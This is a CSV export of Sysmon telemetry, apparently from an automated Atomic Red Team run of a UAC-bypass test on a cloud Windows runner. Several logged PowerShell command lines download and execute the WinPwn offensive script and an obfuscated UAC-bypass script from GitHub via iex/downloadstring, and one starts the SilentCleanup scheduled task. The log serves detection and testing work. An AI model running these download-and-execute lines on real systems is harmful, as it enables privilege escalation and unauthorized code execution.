"TimeCreated","Id","Message"
"12/17/2025 8:02:39 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:02:39.356
ProcessGuid: {f995aebf-639f-6942-7306-000000000e00}
ProcessId: 9208
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_m5yj0cdj.1vu.ps1
CreationUtcTime: 2025-12-17 08:02:39.354
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:39 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 08:02:37.988
ProcessGuid: {f995aebf-639d-6942-6f06-000000000e00}
ProcessId: 8660
QueryName: raw.githubusercontent.com
QueryStatus: 0
QueryResults: ::ffff:185.199.110.133;::ffff:185.199.111.133;::ffff:185.199.108.133;::ffff:185.199.109.133;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:39 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 08:02:37.036
ProcessGuid: {f995aebf-639c-6942-6d06-000000000e00}
ProcessId: 7372
QueryName: raw.githubusercontent.com
QueryStatus: 0
QueryResults: ::ffff:185.199.110.133;::ffff:185.199.111.133;::ffff:185.199.108.133;::ffff:185.199.109.133;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:39 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 08:02:35.944
ProcessGuid: {f995aebf-639b-6942-6b06-000000000e00}
ProcessId: 1216
QueryName: raw.githubusercontent.com
QueryStatus: 0
QueryResults: ::ffff:185.199.110.133;::ffff:185.199.111.133;::ffff:185.199.108.133;::ffff:185.199.109.133;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:38 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 08:02:37.040
ProcessGuid: {f995aebf-639c-6942-6d06-000000000e00}
ProcessId: 7372
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.1.0.149
SourceHostname: runnervm8j6r3.o3imerjm4krehdeh0rvc5luiwc.bx.internal.cloudapp.net
SourcePort: 59167
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 185.199.110.133
DestinationHostname: cdn-185-199-110-133.github.com
DestinationPort: 443
DestinationPortName: https"
"12/17/2025 8:02:38 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:02:38.693
ProcessGuid: {f995aebf-639e-6942-7106-000000000e00}
ProcessId: 10216
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_isqle12f.ybu.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:02:38 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:02:38.674
ProcessGuid: {f995aebf-639e-6942-7106-000000000e00}
ProcessId: 10216
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_isqle12f.ybu.ps1
CreationUtcTime: 2025-12-17 08:02:38.674
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:38 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:02:38.600
ProcessGuid: {f995aebf-639e-6942-7106-000000000e00}
ProcessId: 10216
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/dccuac.ps1')}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-552e-6942-89d0-0b0000000000}
LogonId: 0xBD089
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60ec-6942-6203-000000000e00}
ParentProcessId: 8612
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\cb932f1c-bec9-45d5-9be7-d59944af95ba.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:37 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:02:37.767
ProcessGuid: {f995aebf-639d-6942-6f06-000000000e00}
ProcessId: 8660
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_ktclwraq.p1e.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:02:37 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:02:37.748
ProcessGuid: {f995aebf-639d-6942-6f06-000000000e00}
ProcessId: 8660
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_ktclwraq.p1e.ps1
CreationUtcTime: 2025-12-17 08:02:37.748
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:37 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:02:37.672
ProcessGuid: {f995aebf-639d-6942-6f06-000000000e00}
ProcessId: 8660
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
UACBypass -noninteractive -command \""""C:\windows\system32\cmd.exe\"""" -technique DiskCleanup}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-552e-6942-89d0-0b0000000000}
LogonId: 0xBD089
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60ec-6942-6203-000000000e00}
ParentProcessId: 8612
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\cb932f1c-bec9-45d5-9be7-d59944af95ba.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:37 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 08:02:35.947
ProcessGuid: {f995aebf-639b-6942-6b06-000000000e00}
ProcessId: 1216
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.1.0.149
SourceHostname: runnervm8j6r3.o3imerjm4krehdeh0rvc5luiwc.bx.internal.cloudapp.net
SourcePort: 59166
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 185.199.110.133
DestinationHostname: cdn-185-199-110-133.github.com
DestinationPort: 443
DestinationPortName: https"
"12/17/2025 8:02:36 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:02:36.812
ProcessGuid: {f995aebf-639c-6942-6d06-000000000e00}
ProcessId: 7372
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_czsw24oy.4dx.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:02:36 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:02:36.792
ProcessGuid: {f995aebf-639c-6942-6d06-000000000e00}
ProcessId: 7372
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_czsw24oy.4dx.ps1
CreationUtcTime: 2025-12-17 08:02:36.792
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:36 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:02:36.712
ProcessGuid: {f995aebf-639c-6942-6d06-000000000e00}
ProcessId: 7372
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
UACBypass -noninteractive -command \""""C:\windows\system32\calc.exe\"""" -technique ccmstp}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-552e-6942-89d0-0b0000000000}
LogonId: 0xBD089
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60ec-6942-6203-000000000e00}
ParentProcessId: 8612
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\cb932f1c-bec9-45d5-9be7-d59944af95ba.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:35 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:02:35.716
ProcessGuid: {f995aebf-639b-6942-6b06-000000000e00}
ProcessId: 1216
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_vdun1s05.4np.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:02:35 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:02:35.697
ProcessGuid: {f995aebf-639b-6942-6b06-000000000e00}
ProcessId: 1216
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_vdun1s05.4np.ps1
CreationUtcTime: 2025-12-17 08:02:35.697
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:35 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:02:35.620
ProcessGuid: {f995aebf-639b-6942-6b06-000000000e00}
ProcessId: 1216
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
UACBypass -noninteractive -command \""""C:\windows\system32\cmd.exe\"""" -technique magic}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-552e-6942-89d0-0b0000000000}
LogonId: 0xBD089
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60ec-6942-6203-000000000e00}
ParentProcessId: 8612
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\cb932f1c-bec9-45d5-9be7-d59944af95ba.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:33 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:02:33.252
ProcessGuid: {f995aebf-6399-6942-5806-000000000e00}
ProcessId: 2572
Image: C:\Windows\System32\schtasks.exe
FileVersion: 10.0.26100.6725 (WinBuild.160101.0800)
Description: Task Scheduler Configuration Tool
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: schtasks.exe
CommandLine: schtasks  /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I 
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-552e-6942-89d0-0b0000000000}
LogonId: 0xBD089
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=B96AF3066F0B9DE8A460F77BAAE006C5372A266BE18C561DAA7C7AE8635D399D
ParentProcessGuid: {f995aebf-6398-6942-5206-000000000e00}
ParentProcessId: 2132
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c ""C:\AtomicRedTeam\atomics\T1548.002\src\T1548.002.bat""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:29 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 08:02:29.616
ProcessGuid: {f995aebf-6395-6942-4d06-000000000e00}
ProcessId: 9488
Image: C:\Program Files (x86)\Google\GoogleUpdater\143.0.7482.0\updater.exe
ImageLoaded: C:\Windows\SysWOW64\dbghelp.dll
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows Image Helper
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: DBGHELP.DLL
Hashes: SHA256=11B9FF7634BD6D54CD72A7C679682DABB30F6F0BC0BA5BAE2D3EE2CE3CEA73D2
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: NT AUTHORITY\SYSTEM"
"12/17/2025 8:02:29 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 08:02:29.593
ProcessGuid: {f995aebf-6395-6942-4c06-000000000e00}
ProcessId: 5188
Image: C:\Program Files (x86)\Google\GoogleUpdater\143.0.7482.0\updater.exe
ImageLoaded: C:\Windows\SysWOW64\dbghelp.dll
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows Image Helper
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: DBGHELP.DLL
Hashes: SHA256=11B9FF7634BD6D54CD72A7C679682DABB30F6F0BC0BA5BAE2D3EE2CE3CEA73D2
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: NT AUTHORITY\SYSTEM"
"12/17/2025 8:02:28 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:02:28.860
ProcessGuid: {f995aebf-6394-6942-4a06-000000000e00}
ProcessId: 5072
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_ydgnrnzf.wd5.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:02:28 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:02:28.840
ProcessGuid: {f995aebf-6394-6942-4a06-000000000e00}
ProcessId: 5072
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_ydgnrnzf.wd5.ps1
CreationUtcTime: 2025-12-17 08:02:28.840
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:27 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:02:27.738
ProcessGuid: {f995aebf-6393-6942-4106-000000000e00}
ProcessId: 1208
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_mnbfk20m.kt5.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:02:27 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:02:27.702
ProcessGuid: {f995aebf-6393-6942-4106-000000000e00}
ProcessId: 1208
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_mnbfk20m.kt5.ps1
CreationUtcTime: 2025-12-17 08:02:27.702
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:26 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:02:26.952
ProcessGuid: {f995aebf-6392-6942-3a06-000000000e00}
ProcessId: 7928
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_t41cync4.ttu.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:02:26 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:02:26.920
ProcessGuid: {f995aebf-6392-6942-3a06-000000000e00}
ProcessId: 7928
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_t41cync4.ttu.ps1
CreationUtcTime: 2025-12-17 08:02:26.920
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:25 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:02:25.641
ProcessGuid: {f995aebf-6391-6942-2906-000000000e00}
ProcessId: 8772
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_34mkmdjq.lzj.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:02:25 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:02:25.623
ProcessGuid: {f995aebf-6391-6942-2906-000000000e00}
ProcessId: 8772
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_34mkmdjq.lzj.ps1
CreationUtcTime: 2025-12-17 08:02:25.623
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:23 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:02:23.013
ProcessGuid: {f995aebf-638e-6942-2006-000000000e00}
ProcessId: 8016
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_ta144dwn.my0.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:02:22 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:02:22.995
ProcessGuid: {f995aebf-638e-6942-2006-000000000e00}
ProcessId: 8016
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_ta144dwn.my0.ps1
CreationUtcTime: 2025-12-17 08:02:22.995
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:22 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 08:02:22.733
ProcessGuid: {f995aebf-638e-6942-1f06-000000000e00}
ProcessId: 3244
Image: C:\Windows\System32\net1.exe
ImageLoaded: C:\Windows\System32\samlib.dll
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: SAM Library DLL
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: SAMLib.DLL
Hashes: SHA256=13B0BB662EE434ED5CEE876D95886F4FB5E77C636E7DC645CD7E9BE634665497
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:22 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:02:22.280
ProcessGuid: {f995aebf-638e-6942-1a06-000000000e00}
ProcessId: 5996
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_giymfhko.iof.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:02:22 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:02:22.265
ProcessGuid: {f995aebf-638e-6942-1a06-000000000e00}
ProcessId: 5996
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_giymfhko.iof.ps1
CreationUtcTime: 2025-12-17 08:02:22.265
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:22 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 08:02:21.999
ProcessGuid: {f995aebf-638d-6942-1906-000000000e00}
ProcessId: 5900
Image: C:\Windows\System32\net1.exe
ImageLoaded: C:\Windows\System32\samlib.dll
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: SAM Library DLL
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: SAMLib.DLL
Hashes: SHA256=13B0BB662EE434ED5CEE876D95886F4FB5E77C636E7DC645CD7E9BE634665497
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
